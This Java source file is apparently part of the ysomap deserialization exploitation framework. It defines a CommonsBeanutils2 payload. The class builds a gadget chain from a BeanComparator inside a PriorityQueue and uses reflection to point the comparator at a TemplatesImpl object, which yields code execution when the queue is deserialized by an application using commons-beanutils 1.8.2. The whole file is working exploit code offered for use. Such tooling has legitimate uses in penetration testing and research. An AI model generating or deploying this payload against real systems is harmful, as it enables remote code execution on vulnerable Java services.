package ysomap.payloads.java.commons.beanutils;

import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.TemplatesImplBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.JarHelper;
import ysomap.core.util.ReflectionHelper;
import ysomap.payloads.AbstractPayload;

import java.util.Comparator;
import java.util.PriorityQueue;

/**
 * @author Ar3h
 * @since 2022/11/07
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Targets({Targets.JDK})
@Require(bullets = {"TemplatesImplBullet"},param = false)
@Dependencies({"commons-beanutils:commons-beanutils:1.8.2", "commons-logging:commons-logging:1.2"})
public class CommonsBeanutils2 extends AbstractPayload<Object> {

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return TemplatesImplBullet.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        Class beanComparatorClass = JarHelper.getClassFromJar(JarHelper.CommonsBeanutils182, "org.apache.commons.beanutils.BeanComparator");
        Comparator comparator = (Comparator) beanComparatorClass.getDeclaredConstructor(String.class, Comparator.class).newInstance(null, String.CASE_INSENSITIVE_ORDER);
    
        String action = bullet.get("action");
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("1");

        ReflectionHelper.setFieldValue(comparator, "property", action);

        final Object[] queueArray = (Object[]) ReflectionHelper.getFieldValue(queue, "queue");
        queueArray[0] = obj;
        queueArray[1] = obj;
        return queue;
    }
    
}
